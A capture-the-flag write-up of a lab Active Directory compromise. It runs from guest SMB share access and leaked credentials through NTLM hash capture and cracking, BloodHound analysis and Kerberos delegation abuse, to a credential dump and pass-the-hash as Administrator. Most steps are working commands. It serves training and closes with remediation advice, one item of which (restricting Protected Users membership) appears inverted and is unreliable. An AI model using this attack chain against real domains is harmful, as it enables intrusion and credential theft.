## ProxyChallenge

Windows Active Directory machine. Anonymous SMB access exposed credentials, a BloodHound-identified delegation path led to the Domain Controller, and the Administrator NTLM hash was obtained for pass-the-hash access.

**Target:** 10.49.177.178 (DC01.ctf.local)
**Domain:** ctf.local
**Attack Vector:** Null/guest SMB → Credentials in IT share → RID enumeration → NTLM capture → BloodHound path → Delegation abuse → Administrator hash → Pass-the-Hash
**Difficulty:** Medium

---

### RECONNAISSANCE

**Port Enumeration**

```
53/tcp     DNS            Simple DNS Plus
88/tcp     Kerberos       Microsoft Windows Kerberos
135/tcp    MSRPC
139/445    SMB            Message signing enabled and required
389/636    LDAP/LDAPS     Domain: ctf.local
3268/3269  Global Catalog
3389/tcp   RDP            Microsoft Terminal Services
5985       WinRM          (referenced later for shell access)
9389/tcp   ADWS
```

Service fingerprinting identifies a Windows Server 2019 domain controller named DC01 in the `ctf.local` domain. The RDP certificate and NTLM info confirm the NetBIOS domain name `CTF`.

**Hosts File Update**

```
10.49.177.178 DC01.ctf.local ctf.local
```

---

### ENUMERATION

**SMB Share Discovery**

```
smbclient -L 10.49.177.178 -N
```

```
ADMIN$       Remote Admin
C$           Default share
IPC$         Remote IPC
IT-Shared    IT Department Shared Resources
NETLOGON     Logon server share
SYSVOL       Logon server share
```

Only `IT-Shared` is a non-default share, which makes it the first target.

**RID Brute Force (User Enumeration)**

```
nxc smb 10.49.177.178 -u 'guest' -p '' --rid-brute
```

Relevant accounts recovered:

```
1008  DC01$              (machine account)
1109  DnsAdmins          (group)
1110  DnsUpdateProxy     (group)
1111  svc.scanner        (user)
1112  svc.mssql          (user)
1113  helpdesk.bob       (user)
1114  it.admin           (user)
```

**Anonymous Share Access**

Guest authentication succeeds, which allows access to `IT-Shared`:

```
smbclient.py guest:''@DC01.ctf.local
# use IT-Shared
# mget *
```

Files downloaded:

```
IT-Credentials-Backup.txt
IT-Onboarding-Checklist.txt
IT-Portal.html
```

**Credential Backup File**

`IT-Credentials-Backup.txt` lists two accounts with plaintext passwords. The file marks both as disabled:

```
helpdesk.bob : Welcome123!     [DISABLED - left company 2021]
it.admin     : ITAdmin2019!    [DISABLED - role change 2022]
```

The status labels were not trusted. Both passwords were tested against the domain.

**Credential Validation**

```
nxc smb DC01.ctf.local -u users.txt -p 'ITAdmin2019!' | grep '[+]'
nxc smb DC01.ctf.local -u users.txt -p 'Welcome123!' | grep '[+]'
```

```
[+] ctf.local\it.admin:ITAdmin2019!
[+] ctf.local\helpdesk.bob:Welcome123!
```

Both accounts still authenticate, so "disabled" in the backup file was not accurate. Stale credentials left in shares are a recurring finding on this box.

---

### CREDENTIAL CAPTURE (NTLM THEFT)

The ntlm_theft toolkit was used to generate files that force a Windows host to authenticate to an attacker-controlled SMB server:

```
smbserver.py -smb2support EXEGOL $(pwd)
```

A crafted PowerShell file referencing an attacker UNC path was placed on a writable share. When it is accessed, the victim sends an NTLMv2 challenge response. The captured hash was cracked offline with John the Ripper, which yielded the `svc.scanner` password:

```
svc.scanner : 1summerlove!
```

---

### BLOODHOUND ANALYSIS

With valid domain credentials, the domain was collected for attack path analysis:

```
bloodhound-python -d ctf.local -u svc.scanner -p '1summerlove!' \
  -ns 10.49.177.178 -c all
```

BloodHound identified a path from `svc.scanner` to the Domain Controller. The path is a delegation-based abuse edge that allows impersonation of a privileged user against a CIFS service on DC01.

---

### DELEGATION ABUSE

Request a service ticket impersonating Administrator:

```
getST.py ctf.local/svc.scanner:'1summerlove!' \
  -spn cifs/DC01.ctf.local \
  -impersonate Administrator \
  -dc-ip 10.49.177.178
```

Load the resulting ticket and dump credentials using Kerberos authentication:

```
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
secretsdump.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

`secretsdump` returns the Administrator NTLM hash.

---

### PASS-THE-HASH

```
evil-winrm -i 10.49.177.178 -u Administrator -H dd4592176bb3f58eea4e87a8f0eaf270
```

WinRM authenticates with the NTLM hash, without a plaintext password, and provides an interactive PowerShell session as Administrator.

**Flag**

```
type C:\Users\Administrator\Desktop\flag.txt
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port scan and service/version detection
  ├─ Domain identification (ctf.local, DC01)
  └─ Hosts file update

PHASE 2: Enumeration
  ├─ SMB share listing (IT-Shared is non-default)
  ├─ RID brute force via guest session
  └─ User list built from RID results

PHASE 3: Initial Access
  ├─ Guest access to IT-Shared
  ├─ Download credential backup file
  └─ Validate it.admin and helpdesk.bob credentials

PHASE 4: Credential Capture
  ├─ ntlm_theft file generation
  ├─ Malicious file placed on share
  ├─ NTLMv2 capture via smbserver.py
  └─ Offline crack: svc.scanner:1summerlove!

PHASE 5: Path Analysis
  ├─ BloodHound collection (-c all)
  └─ Path from svc.scanner to DC01 identified

PHASE 6: Domain Compromise
  ├─ Service ticket impersonating Administrator (getST)
  ├─ Ticket-based secretsdump
  └─ Administrator NTLM hash

PHASE 7: Access
  ├─ Pass-the-Hash via evil-winrm
  └─ Flag retrieval
```

---

### VULNERABILITIES

1. **Guest/Null Session Access (High)**
   - Guest account can list and read the IT-Shared share
   - RID cycling exposes the full user list without credentials

2. **Plaintext Credentials in Shared Files (Critical)**
   - IT-Credentials-Backup.txt stores passwords in cleartext
   - Accounts marked "disabled" were still active

3. **Weak Passwords (High)**
   - Passwords such as `Welcome123!` and `ITAdmin2019!` are common and easily guessed
   - `1summerlove!` cracked from an NTLMv2 capture

4. **NTLM Hash Leakage (Medium)**
   - Outbound SMB authentication from a user context allowed hash capture

5. **Delegation Misconfiguration (Critical)**
   - svc.scanner can impersonate Administrator against DC01 CIFS
   - Enables full domain compromise from a low-privilege service account

---

### REMEDIATION

```
├─ Disable guest access and restrict anonymous share enumeration
├─ Remove credential backup files from shares
├─ Disable accounts that are truly unused; verify status in AD
├─ Enforce a strong password policy and screen against breached passwords
├─ Block outbound NTLM/SMB from user workstations to untrusted hosts
├─ Review delegation settings (constrained/unconstrained) on service accounts
├─ Restrict Protected Users membership for privileged accounts
└─ Monitor for S4U ticket requests and anomalous CIFS access to DC01
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- smbclient / smbclient.py (share access)
- nxc / NetExec (RID brute force, credential validation)
- ntlm_theft (NTLM capture file generation)
- smbserver.py (SMB capture listener)
- John the Ripper (hash cracking)
- bloodhound-python (AD collection)
- getST.py / secretsdump.py (Impacket: delegation abuse, credential dump)
- evil-winrm (WinRM shell via pass-the-hash)

**Key Insight:** A guest-readable share held working credentials. Those credentials, plus a captured NTLM hash, led to a service account with delegation rights over the DC.
